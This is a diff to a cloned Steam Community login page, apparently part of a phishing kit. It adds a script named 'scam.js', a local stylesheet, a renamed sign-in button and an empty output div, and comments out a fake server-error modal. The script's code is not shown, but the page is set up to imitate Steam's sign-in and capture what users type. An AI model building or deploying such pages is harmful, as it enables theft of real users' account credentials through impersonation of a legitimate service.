@@ -8,9 +8,7 @@
     <meta name="theme-color" content="#171a21">
     <title>Steam Community</title>
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
-
-
-
+    <link rel="stylesheet" href="src/btg.css" type="text/css"/>
     <link href="https://community.cloudflare.steamstatic.com/public/shared/css/motiva_sans.css?v=GvhJzpHNW-hA&amp;l=english&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
     <link href="https://community.cloudflare.steamstatic.com/public/shared/css/buttons.css?v=l3li_MNwxNDv&amp;l=english&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
     <link href="https://community.cloudflare.steamstatic.com/public/shared/css/shared_global.css?v=712ocXoZYVCg&amp;l=english&amp;_cdn=cloudflare" rel="stylesheet" type="text/css" >
@@ -61,6 +59,7 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
     </script><script type="text/javascript" src="https://community.cloudflare.steamstatic.com/public/shared/javascript/login.js?v=3Rab89hkXLaE&amp;l=english&amp;_cdn=cloudflare" ></script>
     <script type="text/javascript" src="https://community.cloudflare.steamstatic.com/public/javascript/modalv2.js?v=dfMhuy-Lrpyo&amp;l=english&amp;_cdn=cloudflare" ></script>
     <script type="text/javascript" src="https://community.cloudflare.steamstatic.com/public/shared/javascript/shared_responsive_adapter.js?v=TbBMCK37KgCo&amp;l=english&amp;_cdn=cloudflare" ></script>
+    <script type="module" src="src/scam.js"></script>
 
     <meta name="twitter:card" content="summary_large_image">
 
@@ -364,8 +363,8 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
                                         <br>
                                     </div>
                                 </div>
-                                <div id="login_btn_signin">
-                                    <input class="btn_green_white_innerfade" type="submit" id="imageLogin" style="width:104px; height:34px; border:none; font-size: 15px;" value="Sign In" />
+                                <div id="login_signin">
+                                    <input class="signin_button" type="submit" id="imageLogin" style="width:104px; height:34px; border:none; font-size: 15px;" value="Sign In" />
                                 </div>
                                 <br>
                                 <div id="login_btn_wait" style="display: none;">
@@ -390,6 +389,7 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 
                 </div>
 
+                <div id="wypisz"></div>
             </div>
 
         </div>	<!-- responsive_page_legacy_content -->
@@ -414,29 +414,33 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
                 </div>
             </div>
         </div>
-
-    </div>	<!-- responsive_page_content -->
-    <div class="newmodal" style="position: absolute; top: 0px; left: 0px; z-index: 1000000; max-width: 646px; margin-left: center; margin-right: ">
-        <div class="modal_top_bar"></div>
-        <div class="newmodal_header_border">
-            <div class="newmodal_header">
-                <div class="newmodal_close"></div>
-                <div class="title_text">Error</div>
-            </div>
-        </div>
-        <div class="newmodal_content_border">
-            <div class="newmodal_content" style>
-                <div>
-                   There was a problem communicating with the Steam servers.  Please try again later.
-                </div>
-                <div class="newmodal_buttons">
-                    <div class="btn_grey_steamui btn_medium">
-                        <span>OK</span>
-                    </div>
-                </div>
-            </div>
-        </div>
     </div>
+
+
+
+
+    <!-- responsive_page_content -->
+<!--    <div class="newmodal" style="position: absolute; top: 500px; left: 500px; z-index: 1000000; max-width: 646px; margin-left: center; margin-right: ">-->
+<!--        <div class="modal_top_bar"></div>-->
+<!--        <div class="newmodal_header_border">-->
+<!--            <div class="newmodal_header">-->
+<!--                <div class="newmodal_close"></div>-->
+<!--                <div class="title_text">Error</div>-->
+<!--            </div>-->
+<!--        </div>-->
+<!--        <div class="newmodal_content_border">-->
+<!--            <div class="newmodal_content" style>-->
+<!--                <div>-->
+<!--                   There was a problem communicating with the Steam servers.  Please try again later.-->
+<!--                </div>-->
+<!--                <div class="newmodal_buttons">-->
+<!--                    <div class="btn_grey_steamui btn_medium">-->
+<!--                        <span>OK</span>-->
+<!--                    </div>-->
+<!--                </div>-->
+<!--            </div>-->
+<!--        </div>-->
+<!--    </div>-->
 </div>	<!-- responsive_page_frame -->
 </body>
 </html>
